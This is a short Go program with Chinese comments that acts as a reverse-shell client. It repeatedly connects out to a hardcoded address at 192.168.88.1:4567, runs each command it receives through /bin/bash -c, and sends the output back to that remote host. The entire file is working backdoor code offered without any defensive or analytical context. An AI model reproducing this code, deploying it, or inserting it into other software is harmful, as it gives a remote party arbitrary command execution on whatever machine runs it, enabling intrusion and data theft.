package main
import (
    "io"
    "net"
    "io/ioutil"
    "log"
    "os/exec"
    "fmt" 
)
 
var (
    cmd string
    line string
)
 
func main() {
    addr := "192.168.88.1:4567" //远程连接主机名
    for{
    	conn,err := net.Dial("tcp",addr) //拨号操作，用于连接服务端，需要指定协议。
    	if err != nil {
        	fmt.Printf("%s\n",err.Error())
    	}
    	buf := make([]byte,10240) //定义一个切片的长度是10240。
    	for  {
        	n,err := conn.Read(buf) //接受的命令
        	if err != nil && err != io.EOF {  //io.EOF在网络编程中表示对端把链接关闭了。
            	log.Fatal(err)
        	}
 
        	cmd_str := string(buf[:n])
        	cmd := exec.Command("/bin/bash","-c",cmd_str) //命令执行
        	stdout, err := cmd.StdoutPipe()
        	if err != nil {
            	log.Fatal(err)
        	}
        	defer stdout.Close()
        	if err := cmd.Start(); err != nil {
            	log.Fatal(err)
        	}
        	opBytes, err := ioutil.ReadAll(stdout)
        	if err != nil {
            	log.Fatal(err)
        	}
        	conn.Write([]byte(opBytes)) //返回执行结果
    	}
    	
	}
}